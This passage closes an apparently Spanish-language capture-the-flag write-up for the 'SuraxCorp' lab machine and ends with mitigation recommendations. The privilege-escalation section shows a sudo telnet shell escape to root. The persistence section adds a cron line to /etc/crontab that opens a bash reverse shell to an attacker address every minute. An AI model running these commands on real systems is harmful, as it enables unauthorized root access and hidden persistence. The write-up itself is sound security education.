    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

<span class="hl">User suraxddq may run the following commands on TheHackersLabs-SuraxCorp:</span>
<span class="hl">    (ALL) NOPASSWD: /usr/bin/telnet</span>
</pre>

`telnet` está documentado en GTFOBins como binario con capacidad de escape a shell interactiva mediante su modo de comandos internos, cuando se ejecuta con privilegios elevados vía `sudo` sin restricciones:

<pre class="term-log">
<span class="cmd">$ sudo /usr/bin/telnet</span>
telnet&gt; !/bin/bash
root@TheHackersLabs-SuraxCorp:/home/suraxddq/ssti# id &amp;&amp; whoami
<span class="hl-green">uid=0(root) gid=0(root) groups=0(root)</span>
root
</pre>

**Desglose de la técnica:**

- El modo interactivo de `telnet` acepta comandos internos precedidos por `!`, que ejecutan el comando indicado en una subshell del sistema heredando los privilegios efectivos del propio proceso `telnet` — en este caso, root por la regla `sudo`.

### Flag de root

<pre class="term-log">
<span class="cmd">$ cat /root/root.txt</span>
<span class="hl-green">THL{47d7578...e6e8ccd1}</span>
</pre>

## Persistencia — cron con reverse shell

Antes de modificar cualquier fichero del sistema, se preserva una copia del estado original de las tareas programadas:

<pre class="term-log">
<span class="cmd">$ crontab -l > /root/.crontab_backup_original 2>/dev/null</span>
<span class="cmd">$ cat /etc/crontab > /root/.etc_crontab_backup_original</span>
</pre>

Se añade una entrada de cron que ejecuta una reverse shell cada minuto:

<pre class="term-log">
Terminal atacante
<span class="cmd">$ nc -lvnp 4444</span>
listening on [any] 4444 ...
</pre>

<pre class="term-log">
Terminal víctima (root)
<span class="cmd">$ echo '* * * * * root bash -c "bash -i >&amp; /dev/tcp/10.0.2.3/4444 0>&amp;1"' >> /etc/crontab</span>
</pre>

<pre class="term-log">
Terminal atacante
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.6] 40424</span>
bash: cannot set terminal process group (2537): Inapprop
bash: no job control in this shell
root@TheHackersLabs-SuraxCorp:~# <span class="cmd">id &amp;&amp; whoami</span>
<span class="hl-green">uid=0(root) gid=0(root) groups=0(root)</span>
root
</pre>

Persistencia confirmada: la entrada en `/etc/crontab` garantiza una reverse shell como root cada minuto, independiente de la sesión SSTI original.

## Conclusión

SuraxCorp encadena seis fallos de naturaleza muy distinta: exposición de un servicio (rsync) exclusivamente por una ruta de red no evidente (IPv6 link-local) con un recurso de lectura anónima, un mecanismo de login que no valida contraseña, una credencial embebida en texto plano dentro de un binario distribuido públicamente, un vhost administrativo descubierto por fuga de tráfico DNS en lugar de estar protegido por control de acceso, inyección de comandos en un campo de diagnóstico de red insuficientemente saneado, una aplicación interna con SSTI activable a voluntad, y una regla `sudo` sin restricción sobre un binario con escape documentado.

## Recomendaciones de mitigación

**Exposición de rsync sin autenticación:** configurar `rsyncd.conf` con `auth users` y `secrets file` para exigir credenciales en cualquier módulo, restringir el acceso por `hosts allow`, y auditar qué servicios quedan expuestos en interfaces o protocolos adicionales (como IPv6) que no forman parte del escaneo de rutina.

**Autenticación que no valida contraseña:** revisar la lógica de login para exigir verificación real de la credencial contra el almacén de usuarios en todos los flujos de autenticación, y añadir pruebas automatizadas que confirmen el rechazo de credenciales incorrectas o incompletas antes de cada despliegue.

**Credenciales embebidas en binarios distribuidos:** eliminar cualquier secreto hardcodeado del código fuente o de los binarios compilados; usar autenticación por token de corta duración o flujos OAuth para la sincronización de aplicaciones cliente-servidor, y ejecutar análisis estático (`strings`, escaneo de secretos tipo `gitleaks` o `trufflehog`) sobre los artefactos antes de publicarlos.

**Inyección de comandos en el diagnóstico de red:** sustituir la construcción de comandos por concatenación de cadenas por llamadas a bibliotecas nativas (por ejemplo el módulo `ping3` de Python o `subprocess.run` con lista de argumentos y sin `shell=True`), aplicando además validación estricta de formato de IP/hostname mediante expresión regular o parsing de biblioteca estándar.

**SSTI en la aplicación Flask:** evitar renderizar con Jinja2 cualquier cadena que provenga directamente de entrada de usuario (`render_template_string` sobre datos no confiables); usar `render_template` con plantillas estáticas y pasar los datos de usuario como variables de contexto, nunca como parte del propio template. Consultar la guía de [OWASP sobre Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) para los vectores de detección y mitigación específicos de cada motor de plantillas.

**Sudo sin restricción sobre telnet:** retirar la regla `sudo NOPASSWD: /usr/bin/telnet` salvo necesidad operativa estrictamente justificada; en tal caso, revisar el binario contra la base de [GTFOBins](https://gtfobins.github.io/gtfobins/telnet/) antes de conceder privilegios elevados sobre él, ya que su modo interactivo permite escape directo a shell del sistema.
</content>
